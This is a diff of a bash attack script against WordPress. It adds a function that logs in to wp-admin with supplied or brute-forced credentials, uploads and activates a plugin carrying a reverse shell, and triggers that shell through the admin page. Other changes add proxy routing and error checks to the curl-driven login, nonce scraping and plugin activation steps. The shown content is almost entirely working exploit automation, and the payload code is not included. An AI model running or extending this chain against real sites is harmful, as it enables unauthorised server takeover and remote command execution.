@@ -72,6 +72,22 @@ brute_force_wp_login() {
     run_wpscan
 }
 
+perform_wp_plugin_webshell() {
+    if ! login_wp; then
+        echo "Login failed"
+        return 1
+    fi
+    create_wp_plugin_reverse_shell
+    if ! upload_wp_plugin; then
+        echo "Plugin upload failed"
+        return 1
+    fi
+    if ! run_wp_plugin_reverse_shell; then
+        echo "Running plugin reverse shell failed"
+        return 1
+    fi
+}
+
 login_wp() {
     if [[ -z "$target_url" ]]; then
         echo "Target hostname is not set. Using ip"
@@ -86,13 +102,20 @@ login_wp() {
         return 1
     fi
     echo "Logging in to WordPress at $target_url/wp-login.php"
-    curl -s -b $cookie_jar -c $cookie_jar -d "log=$username" -d "pwd=$password" \
+    response=$(curl -s -L -b $cookie_jar -c $cookie_jar -d "log=$username" -d "pwd=$password" \
         -d "wp-submit=Log+In" -d "redirect_to=$target_url/wp-admin/" -d "testcookie=1" \
-        $target_url/wp-login.php
-    
+        $target_url/wp-login.php $proxy_option)
+    if [[ $response == *"Dashboard"* ]]; then
+        echo "Login successful"
+        return 0
+    else
+        echo "Login failed"
+        return 1
+    fi
+
 }
 
-upload_plugin() {
+upload_wp_plugin() {
     echo "Start of uploading plugin..."
     if [[ -z "$cookie_jar" ]]; then
         echo "Cookie jar is not set. Please login first"
@@ -114,14 +137,18 @@ upload_plugin() {
     fi
     target_url=$(echo "$target_url" | sed 's/\/$//')
     local plugin_page=""
-    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugins.php" | grep "$plugin_name" )
+    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugins.php" $proxy_option | grep "$plugin_name" )
     if [[ -z "$plugin_page" ]]; then
         echo "Plugin not found, uploading..."
-        nonce=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugin-install.php?tab=upload"| grep -oP 'name="_wpnonce" value="\K[^"]+')
+        nonce=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugin-install.php?tab=upload" $proxy_option | grep -oP 'name="_wpnonce" value="\K[^"]+')
+        if [[ -z "$nonce" ]]; then
+            echo "Could not find nonce for plugin upload"
+            return 1
+        fi
         echo "Nonce: $nonce"    
-        curl -s -b "$cookie_jar" -c "$cookie_jar" -F "_wpnonce=$nonce" -F "_wp_http_referer=/wp-admin/plugin-install.php" -F "pluginzip=@$plugin_file" "$target_url/wp-admin/update.php?action=upload-plugin"  >upload_result.txt
+        response=$(curl -s -b "$cookie_jar" -c "$cookie_jar" -F "_wpnonce=$nonce" -F "_wp_http_referer=/wp-admin/plugin-install.php" -F "pluginzip=@$plugin_file" $proxy_option "$target_url/wp-admin/update.php?action=upload-plugin")
     fi
-    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugins.php" | grep "$plugin_name" )
+    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/plugins.php" $proxy_option | grep "$plugin_name" )
     if [[ -z "$plugin_page" ]]; then
         echo "Plugin not found after upload."
         return 1
@@ -133,11 +160,16 @@ upload_plugin() {
         echo "Plugin is not activated, activating now..."
         echo "$plugin_page" > plugin_page.txt
         activate_url=$(echo "$plugin_page" | grep -oP "<span class='activate'><a href=\"\K[^\"]+" | sed 's/\&amp;/\&/g')
+        if [[ -z "$activate_url" ]]; then
+            echo "Could not find plugin activation URL"
+            return 1
+        fi
         echo "$activate_url"
-        curl -s -v -b $cookie_jar -c $cookie_jar "$target_url/wp-admin/$activate_url" > activation_result.txt
+        response=$(curl -s -v -b $cookie_jar -c $cookie_jar "$target_url/wp-admin/$activate_url" $proxy_option)
+        echo "$response" > activation_result.txt
     fi
 
-    plugin_page=$(curl -s -b $cookie_jar -c $cookie_jar "$target_url/wp-admin/plugins.php" | grep "$plugin_name" )
+    plugin_page=$(curl -s -b $cookie_jar -c $cookie_jar "$target_url/wp-admin/plugins.php" $proxy_option | grep "$plugin_name" )
     deactivate=$(echo "$plugin_page" | grep "Deactivate" )
     if [[ -z "$deactivate" ]]; then
         echo "Plugin is not activated, activation failed."
@@ -178,7 +210,7 @@ run_wp_plugin_reverse_shell() {
     local shell_url="$target_url/wp-admin/admin.php?page=$plugin_name"
     echo "Running reverse shell at $shell_url"
     local plugin_page=""
-    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$shell_url")
+    plugin_page=$(curl -s -b "$cookie_jar" -c "$cookie_jar" $proxy_option "$shell_url")
     if [[ -z "$plugin_page" ]]; then
         echo "Plugin page is empty. Plugin may not be activated or not uploaded correctly."
         return 1
